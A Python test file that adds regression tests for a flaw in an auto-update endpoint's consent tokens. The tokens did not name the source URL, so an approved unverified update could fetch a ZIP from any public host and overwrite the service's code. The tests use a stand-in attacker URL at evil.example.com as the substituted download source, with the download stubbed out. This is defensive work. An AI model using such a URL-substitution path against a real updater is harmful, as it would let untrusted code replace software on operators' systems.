"""Update consent has to name the artefact, not just the version.

Bug #70. `arena/admin/handlers_update.py` came back from the mutation
sweep at **193 of 198 mutants surviving**, so the update path was barely
executed by tests. Reading it turned up a gap in the consent design
rather than a coding mistake.

`consent_token(tag=..., sha256=...)` covered the version and the digest
but **not the source URL**. On the verified path that is survivable: a
substituted URL serves different bytes, `download_release` compares the
digest and aborts. On the **unverified** path -- `accept_no_verification
=true`, digest replaced by the literal `"UNVERIFIED"` -- nothing else is
checked, and `arena.security_ssrf._validate_url` only blocks loopback,
link-local and non-HTTP schemes. Verified by execution:
`https://evil.example.com/payload.zip` passes SSRF validation.

So an operator approving "update to v4.164.0" produced a token that
authorised a ZIP from *any* public HTTPS host, and this endpoint
overwrites the bridge's own code.

The token also used 8 hex characters. That was never the weak part --
consent is derived from values the caller already has, so there is
nothing to brute-force -- but 32 bits invites accidental collisions in
audit logs, and widening costs nothing.
"""
from __future__ import annotations

import pytest

from arena.admin import auto_update as au
from arena.security_ssrf import _validate_url

OFFICIAL = (
    "https://github.com/IvanSkainet/arena-agent/releases/download/"
    "v4.164.0/arena-agent-v4.164.0.zip"
)
ATTACKER = "https://evil.example.com/arena-agent-v4.164.0.zip"
DIGEST = "a" * 64


def test_the_premise_holds_ssrf_does_not_restrict_the_host():
    """This test is only meaningful if a foreign host is reachable.

    If SSRF validation is ever tightened to an allow-list, the bug below
    stops being exploitable and this test says so out loud instead of
    silently passing for the wrong reason.
    """
    assert _validate_url(ATTACKER) is None, (
        "a foreign HTTPS host is now blocked upstream; re-read whether the "
        "consent binding is still the control that matters"
    )


def test_unverified_consent_is_bound_to_the_source_url():
    """The core of #70: same tag, no digest, different origin."""
    approved = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=OFFICIAL)
    elsewhere = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=ATTACKER)
    assert approved != elsewhere, (
        "a consent minted for the official release also authorises a ZIP "
        "from any other host"
    )


def test_verified_consent_is_bound_to_the_source_url_too():
    """Defence in depth: the digest already stops this, but consent
    should still describe what was approved."""
    a = au.consent_token(tag="v4.164.0", sha256=DIGEST, asset_url=OFFICIAL)
    b = au.consent_token(tag="v4.164.0", sha256=DIGEST, asset_url=ATTACKER)
    assert a != b


def test_an_unverified_consent_cannot_be_minted_without_a_url():
    """Fail closed rather than issue a token that authorises anything."""
    with pytest.raises(ValueError, match="asset_url is required"):
        au.consent_token(tag="v4.164.0", sha256="UNVERIFIED")
    with pytest.raises(ValueError):
        au.consent_token(tag="v4.164.0", sha256="UNVERIFIED", asset_url="")


def test_apply_update_rejects_a_consent_minted_for_another_url(monkeypatch):
    """End to end through apply_update, not just the token helper.

    The download is stubbed because the point is the refusal: if the
    consent check passed, the stub would report a successful install.
    """
    called = {"downloaded": False}

    def _fake_download(**kwargs):
        called["downloaded"] = True
        return {"ok": True, "path": "/nonexistent.zip", "sha256": DIGEST}

    monkeypatch.setattr(au, "download_release", _fake_download)

    stolen = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=OFFICIAL)
    result = au.apply_update(
        asset_url=ATTACKER,
        asset_name="arena-agent-v4.164.0.zip",
        tag="v4.164.0",
        expected_sha256=None,
        consent=stolen,
        restart=False,
        accept_no_verification=True,
    )
    assert result.get("ok") is False, result
    assert "consent" in str(result.get("error", "")).lower(), result
    assert called["downloaded"] is False, (
        "the bridge fetched the attacker's archive before checking consent"
    )


def test_the_matching_consent_still_works(monkeypatch):
    """Reverse sabotage: the binding must not break a legitimate install.

    An operator who approves the URL they are actually installing from
    has to be able to proceed, or the guard gets routed around.
    """
    seen = {}

    def _fake_download(**kwargs):
        seen.update(kwargs)
        return {"ok": False, "error": "STUB_REACHED_DOWNLOAD"}

    monkeypatch.setattr(au, "download_release", _fake_download)

    good = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=ATTACKER)
    result = au.apply_update(
        asset_url=ATTACKER,
        asset_name="arena-agent-v4.164.0.zip",
        tag="v4.164.0",
        expected_sha256=None,
        consent=good,
        restart=False,
        accept_no_verification=True,
    )
    assert result.get("error") == "STUB_REACHED_DOWNLOAD", result
    assert seen.get("asset_url") == ATTACKER, (
        "the consent check rejected a token minted for this exact URL"
    )


def test_the_hint_names_a_token_that_actually_works(monkeypatch):
    """A refusal that prints an unusable token trains people to ignore it.

    `apply_update` tells the caller which consent to pass when the digest
    is missing. That string has to be the one the next call will accept,
    which means it must include the same URL.
    """
    result = au.apply_update(
        asset_url=ATTACKER,
        asset_name="a.zip",
        tag="v4.164.0",
        expected_sha256=None,
        consent="",
        restart=False,
        accept_no_verification=False,
    )
    assert result.get("ok") is False
    hint = str(result.get("hint", ""))
    expected = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=ATTACKER)
    assert expected in hint, (hint, expected)


def test_the_http_handler_offers_a_url_bound_consent():
    """The Dashboard echoes back whatever the endpoint hands it.

    Asserting on the source rather than spinning a server: what matters
    is that the handler passes asset_url through, because a token minted
    without it would be rejected by apply_update and the operator would
    be stuck in a loop.
    """
    import ast
    import pathlib

    # Sabotage found the first version of this test toothless: it searched
    # the whole file for the substring `asset_url=asset_url`, which also
    # matches the apply_update() call further down -- so deleting the
    # argument from the consent_token() call changed nothing. Parse the
    # call instead of grepping near it.
    source = (pathlib.Path(au.__file__).parent / "handlers_update.py").read_text(
        encoding="utf-8"
    )
    tree = ast.parse(source)
    calls = [
        node for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "consent_token"
    ]
    assert calls, "handlers_update.py no longer mints a consent token"
    for call in calls:
        names = {kw.arg for kw in call.keywords}
        assert "asset_url" in names, (
            f"consent_token() at line {call.lineno} is minted without the "
            f"source URL; apply_update would then reject the token it just "
            f"handed the operator"
        )


def test_the_token_is_wide_enough_to_not_collide_by_accident():
    token = au.consent_token(tag="v1", sha256=DIGEST, asset_url=OFFICIAL)
    body = token.removeprefix("yes-update-")
    assert len(body) == 16, token
    assert all(c in "0123456789abcdef" for c in body), token


def test_tokens_stay_deterministic():
    """Operators copy these between two calls; they cannot be random."""
    first = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=OFFICIAL)
    second = au.consent_token(
        tag="v4.164.0", sha256="UNVERIFIED", asset_url=OFFICIAL)
    assert first == second
